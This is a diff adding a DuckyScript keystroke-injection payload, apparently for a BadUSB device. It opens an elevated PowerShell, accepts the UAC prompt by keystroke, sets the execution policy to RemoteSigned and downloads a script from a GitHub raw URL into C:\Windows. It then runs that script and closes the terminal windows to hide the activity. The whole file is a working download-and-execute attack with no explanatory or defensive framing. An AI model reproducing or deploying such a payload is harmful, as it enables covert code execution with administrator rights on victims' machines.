@@ -1,0 +1,29 @@
+REM |===Start Windows Terminal as admin===|
+DELAY 2000
+GUI r
+DELAY 250
+STRING powershell -Command "Start-Process powershell -Verb RunAs"
+ENTER
+DELAY 2500
+LEFT
+ENTER
+
+DELAY 3000
+STRING Set-ExecutionPolicy RemoteSigned
+ENTER
+DELAY 200
+STRING a 
+ENTER
+DELAY 200
+STRING $url = "https://raw.githubusercontent.com/foguhh/powershell/main/main.ps1"
+ENTER
+STRING $outFile = "C:\Windows\main.ps1"
+ENTER
+STRING (new-object Net.WebClient).DownloadFile($url, $outFile)
+ENTER
+STRING C:\Windows\main.ps1
+ENTER
+DELAY 500
+STRING Stop-Process -Name powershell, WindowsTerminal
+ENTER
+DELAY 500
